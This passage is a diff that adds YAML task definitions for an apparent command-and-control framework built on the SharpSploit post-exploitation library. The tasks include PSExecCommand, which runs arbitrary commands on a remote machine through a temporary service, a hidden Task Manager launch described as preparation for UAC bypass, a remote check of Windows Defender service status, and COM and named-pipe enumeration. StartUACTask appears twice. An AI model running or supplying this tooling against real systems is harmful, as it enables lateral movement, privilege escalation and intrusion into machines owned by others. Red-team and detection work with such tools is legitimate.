+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: StartUACTask
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: It starts a UAC task and returns it PID for further UAC bypass
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "    using System;\n\n\n    public static class Task\n    {\n        public static string Execute()\n        {\n            var startInfo = new System.Diagnostics.ProcessStartInfo { \n                FileName = @\"C:\\Windows\\System32\\Taskmgr.exe\\\", \n                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden \n            }; \n            var taskmgr = new System.Diagnostics.Process { \n                StartInfo = startInfo \n            };\n            taskmgr.Start();\n            return taskmgr.Id.ToString();\n        }\n    }"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies:
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  EmbeddedResources: []
+- Name: GetCOMKeys
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: Returns x amount of COM keys and its members functions/properties (x defaults to 10)
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "\nusing System;\nusing System.ServiceProcess;\nusing System.IO;\nusing System.Reflection;\nusing System.Management.Automation;\nusing System.Collections.Generic;\nusing System.Collections.ObjectModel;\nusing Microsoft.Win32;\n\nusing SharpSploit.Execution;\n\n\n\npublic static class Task\n{\n		public static string InspectCOMMembers(Type type)\n        {\n            Int32 tabs = 25;\n            string members = \"\";\n\n            foreach (MemberInfo mi in type.GetMembers())\n            {\n                \n                string Name = mi.Name;\n                string membertype = \"\";\n                string parameters = \"\";\n                string returntiype = \"\";\n               \n                if (mi.MemberType == MemberTypes.Method)\n                {\n                    membertype = \"Method\";\n\n                    foreach (ParameterInfo pi in ((MethodInfo)mi).GetParameters())\n                    {\n                        parameters=String.Format(\"{0} {1} ({2} {3});\", ((MethodInfo)mi).ReturnType.ToString(), Name, pi.ParameterType, pi.Name);\n                        \n                    }\n                    if (parameters == \"\")\n                    {\n                        parameters = String.Format(\"{0} {1} ();\", ((MethodInfo)mi).ReturnType.ToString(), Name);\n                    }\n                }\n\n                if (mi.MemberType == MemberTypes.Property)\n                {\n                    membertype = \"Property\";\n                    foreach (MethodInfo am in ((PropertyInfo)mi).GetAccessors())\n                    {\n                        parameters = String.Format(\"{0}\", am);\n                    }\n                }\n                string member = String.Format(\"{0}{1}{2}{3}{4}{5}\", Name,\n                    new String(' ', tabs - Name.Length),\n                    membertype, new String(' ', (tabs - membertype.Length) / 2),\n                    parameters, Environment.NewLine);\n\n                members = members + member;\n            }\n            return members;\n        }\n        static string GetKeys(string path, string amount = \"10\")\n        {\n        	Int32 _amount = Int32.Parse(amount);\n            RegistryKey rkey = Registry.ClassesRoot.OpenSubKey(path);\n            // Retrieve all the subkeys for the specified key.\n            String[] names = rkey.GetSubKeyNames();\n\n            int icount = 0;\n\n            Console.WriteLine(\"Subkeys of \" + rkey.Name);\n            Console.WriteLine(\"-----------------------------------------------\");\n            String output = \"\";\n         \n            foreach (String s in names)\n            {\n                Int32 i = 0;\n                if (icount == 0)\n                {\n                    icount++;\n                    continue;\n                }\n\n                try\n                {\n                 \n                    var type = System.Type.GetTypeFromCLSID(new Guid(s.Trim()));\n                    object item = System.Activator.CreateInstance(type);\n                    output += String.Format(\"\\t{0}\" + Environment.NewLine + \"\\tType: {1}{2}\", s, type.Name, Environment.NewLine);                 \n                    output = output + String.Format(\"Name\\t\\t\\tMemberType\\t\\tDefinition\" \n                        + Environment.NewLine \n                        + new string('-', 60) \n                        + Environment.NewLine);\n                \n                    output = output + InspectCOMMembers(item.GetType());\n                    output = output +  Environment.NewLine;\n\n                }\n                catch (Exception e)\n                {\n                    continue;\n                }\n\n                if (icount >= _amount)\n                    break;\n                icount++;\n            }\n            return output;\n        }\n\n    public static string Execute(string path, string amount)\n    {\n        try\n        {\n            return GetKeys(path, amount);\n        }\n        catch (Exception e) { return e.GetType().FullName + \": \" + e.Message + Environment.NewLine + e.StackTrace; }\n    }\n}"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: path
+    Value: ''
+    DefaultValue: ''
+    Description: ''
+    SuggestedValues:
+    - CLSID
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: amount
+    Value: ''
+    DefaultValue: 10
+    Description: ''
+    SuggestedValues:
+    - 10
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: GetNamedPipes
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: Return all the named pipes
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.IO;
+
+
+    public static class Task
+
+    {
+        public static string Execute()
+        {
+            try
+            {
+                string pipes = "";
+                string[] pipes_arr = Directory.GetFiles("\\\\.\\\\pipe\\\\");
+                Array.Sort(pipes_arr, StringComparer.InvariantCulture);
+                foreach (string f in pipes_arr)
+                {
+                    string[] pipe = f.Split('\\');
+                    pipes = pipes + pipe[pipe.Length-1] + Environment.NewLine;
+                }
+                return pipes;
+            }
+            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: GetServiceStatus
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: Return the status of a service in a foreign system
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >-
+    using System;
+
+    using System.IO;
+
+    using System.Linq;
+
+    using System.Text;
+
+    using System.Security;
+
+    using System.Security.Principal;
+
+    using System.Collections.Generic;
+
+    using SharpSploit.Credentials;
+
+    using SharpSploit.Enumeration;
+
+    using SharpSploit.Execution;
+
+    using SharpSploit.Generic;
+
+    using SharpSploit.Misc;
+
+    using SharpSploit.LateralMovement;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string RemoteHost, String Service)
+        {
+        	var defender = SCM.GetService(RemoteHost, Service);
+            return defender.Status.ToString();
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: RemoteHost
+    Value: ''
+    DefaultValue: ''
+    Description: remote system to check
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Service
+    Value: ''
+    DefaultValue: ''
+    Description: Service to perform the check agains
+    SuggestedValues:
+    - WinDefend
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: PSExecCommand
+  Aliases: []
+  Author:
+    Name: Daniel Duggan
+    Handle: _RastaMouse
+    Link: https://twitter.com/_RastaMouse
+  Description: Execute a command on a remote system using Service Control Manager - SCM
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: >
+    using System;
+
+    using System.IO;
+
+    using System.Linq;
+
+
+    using SharpSploit.LateralMovement;
+
+
+    public static class Task
+
+    {
+        public static string Execute(string ComputerName, string Command)
+        {
+            string randName = GenerateRandomString(8);
+
+            try
+            {
+                if (!SCM.CreateService(ComputerName, randName, "", Command))
+                {
+                    return "[x] Failed to create service";
+                }
+                if (!SCM.StartService(ComputerName, randName))
+                {
+                    SCM.DeleteService(ComputerName, randName);
+                    return $@"[+] Service {randName} created ({Command})";
+                }
+                if (!SCM.DeleteService(ComputerName, randName))
+                {
+                    return "[x] Failed to delete service";
+                }
+
+                return $@"[+] Service {randName} created ({Command})";
+            }
+            catch (Exception e)
+            {
+                if (e.Message.Contains("Cannot start service"))
+                {
+                	  SCM.DeleteService(ComputerName, randName);
+                    return $@"[+] Service {randName} created ({Command})";
+                }
+                else
+                {
+                    return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace;
+                }
+            }
+        }
+
+        private static string GenerateRandomString(int length)
+        {
+            Random random = new Random();
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
+    }
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: ComputerName
+    Value: ''
+    DefaultValue: ''
+    Description: ComputerName to launch the command on.
+    SuggestedValues:
+    - localhost
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Command
+    Value: ''
+    DefaultValue: ''
+    Description: Command to execute on the remote system.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+- Name: StartUACTask
+  Aliases: []
+  Author:
+    Name: Victor Flores
+    Handle: ''
+    Link: ''
+  Description: It starts a UAC task and returns it PID for further UAC bypass
+  Help: 
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net40
+  Code: "    using System;\n\n\n    public static class Task\n    {\n        public static string Execute()\n        {\n            var startInfo = new System.Diagnostics.ProcessStartInfo { \n                FileName = @\"C:\\Windows\\System32\\Taskmgr.exe\\\", \n                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden \n            }; \n            var taskmgr = new System.Diagnostics.Process { \n                StartInfo = startInfo \n            };\n            taskmgr.Start();\n            return taskmgr.Id.ToString();\n        }\n    }"
+  TaskingType: Assembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries:
+  - Name: SharpSploit
+    Description: SharpSploit is a library for C# post-exploitation modules.
+    Location: SharpSploit/SharpSploit/
+    Language: CSharp
+    CompatibleDotNetVersions:
+    - Net35
+    - Net40
+    ReferenceAssemblies:
+    - Name: System.Windows.Forms.dll
+      Location: net35/System.Windows.Forms.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net40/System.Management.dll
+      DotNetVersion: Net40
+    - Name: System.ServiceProcess.dll
+      Location: net40/System.ServiceProcess.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net40/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net40
+    - Name: System.IdentityModel.dll
+      Location: net40/System.IdentityModel.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40/System.Core.dll
+      DotNetVersion: Net40
+    - Name: System.Windows.Forms.dll
+      Location: net40/System.Windows.Forms.dll
+      DotNetVersion: Net40
+    - Name: System.DirectoryServices.dll
+      Location: net40/System.DirectoryServices.dll
+      DotNetVersion: Net40
+    - Name: mscorlib.dll
+      Location: net40/mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40/System.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net35/System.XML.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net35/System.Management.Automation.dll
+      DotNetVersion: Net35
+    - Name: System.dll
+      Location: net35/System.dll
+      DotNetVersion: Net35
+    - Name: System.Core.dll
+      Location: net35/System.Core.dll
+      DotNetVersion: Net35
+    - Name: System.IdentityModel.dll
+      Location: net35/System.IdentityModel.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.Protocols.dll
+      Location: net35/System.DirectoryServices.Protocols.dll
+      DotNetVersion: Net35
+    - Name: System.ServiceProcess.dll
+      Location: net35/System.ServiceProcess.dll
+      DotNetVersion: Net35
+    - Name: System.Management.dll
+      Location: net35/System.Management.dll
+      DotNetVersion: Net35
+    - Name: System.DirectoryServices.dll
+      Location: net35/System.DirectoryServices.dll
+      DotNetVersion: Net35
+    - Name: mscorlib.dll
+      Location: net35/mscorlib.dll
+      DotNetVersion: Net35
+    - Name: System.Management.Automation.dll
+      Location: net40/System.Management.Automation.dll
+      DotNetVersion: Net40
+    - Name: System.XML.dll
+      Location: net40/System.XML.dll
+      DotNetVersion: Net40
+    EmbeddedResources: []
+  ReferenceAssemblies:
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  EmbeddedResources: []
